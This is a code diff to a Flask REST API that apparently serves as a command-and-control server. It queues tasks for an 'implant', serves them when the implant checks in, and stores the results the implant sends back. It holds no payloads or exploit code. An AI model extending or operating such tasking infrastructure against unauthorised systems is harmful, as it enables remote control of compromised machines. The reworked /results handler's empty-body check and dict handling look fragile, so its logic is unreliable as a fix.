Fixed /results

+++ resources.py
@@ -22,7 +22,7 @@ class Tasks(Resource):
         # Get the number of Task objects in the request
         obj_num = len(body)
         # For each Task object, add it to the database
-        for i in range(len(body)):
+        for i in range(obj_num):
             # Add a task UUID to each task object for tracking
             json_obj[i]['task_id'] = str(uuid.uuid4())
             # Save Task object to database
@@ -33,7 +33,6 @@ class Tasks(Resource):
                 # Anything that comes after task_type and task_id is treated as an option
                 if (key != "task_type" and key != "task_id"):
                     task_options.append(key + ": " + json_obj[i][key])
-
             # Add to task history
             TaskHistory(
                 task_id=json_obj[i]['task_id'],
@@ -47,6 +46,7 @@ class Tasks(Resource):
                         mimetype="application/json",
                         status=200)
 
+
 class Results(Resource):
     # ListResults
     def get(self):
@@ -57,59 +57,45 @@ class Results(Resource):
     # AddResults
     def post(self):
         # Check if results from the implant are populated
-        body = request.get_json()
-        if not body:
-            # If the body is empty or None, just serve new tasks
+        if str(request.get_json()) != '{}':
+            # Parse out the result JSON that we want to add to the database
+            body = request.get_json()
+            print("Received implant response: {}".format(body))
+            json_obj = json.loads(json.dumps(body))
+            # Add a result UUID to each result object for tracking
+            json_obj['result_id'] = str(uuid.uuid4())
+            Result(**json_obj).save()
+            # Serve latest tasks to implant
             tasks = Task.objects().to_json()
+            # Clear tasks so they don't execute twice
+            Task.objects().delete()
+            return Response(tasks, mimetype="application/json", status=200)
+        else:
+            # Serve latest tasks to implant
+            tasks = Task.objects().to_json()
+            # Clear tasks so they don't execute twice
             Task.objects().delete()
             return Response(tasks, mimetype="application/json", status=200)
 
-        print("Received implant response: {}".format(body))
-
-        # The body is a list of result objects, so we loop through it
-        for result_item in body:
-            # Each item is a dict like {'task_id': {'contents': '...', 'success': '...'}}
-            # We get the first (and only) key-value pair
-            task_id, result_data = next(iter(result_item.items()))
-
-            # Create a new, clean dictionary for the database model
-            # It combines the task_id with the contents from the nested dict
-            # The **result_data unpacks the {'contents': '...', 'success': '...'} dict
-            parsed_result = {
-                'task_id': task_id,
-                **result_data
-            }
-
-            # Add a result UUID for tracking this specific result entry
-            parsed_result['result_id'] = str(uuid.uuid4())
-
-            # Save the properly formatted result to the database
-            Result(**parsed_result).save()
-
-        # After saving all results, serve the latest tasks to the implant
-        tasks = Task.objects().to_json()
-        # Clear tasks so they don't execute twice
-        Task.objects().delete()
-        return Response(tasks, mimetype="application/json", status=200)
-    
 
 class History(Resource):
     # ListHistory
     def get(self):
-        # Get all task history objectgs so we can return them
+        # Get all the task history objects so we can return them to the user
         task_history = TaskHistory.objects().to_json()
-        # Update any served tasks with results
-        # Get all relut objects and retrun them:
+        # Update any served tasks with results from implant
+        # Get all the result objects and return them to the user
         results = Result.objects().to_json()
         json_obj = json.loads(results)
-        # Format each result from the imploant to be displayable:
+        # Format each result from the implant to be more friendly for consumption/display
         result_obj_collection = []
         for i in range(len(json_obj)):
             for field in json_obj[i]:
-                result_obj_collection.append({
+                result_obj = {
                     "task_id": field,
                     "task_results": json_obj[i][field]
-                })
+                }
+                result_obj_collection.append(result_obj)
         # For each result in the collection, check for a corresponding task ID and if
         # there's a match, update it with the results. This is hacky and there's probably
         # a more elegant solution to update tasks with their results when they come in...
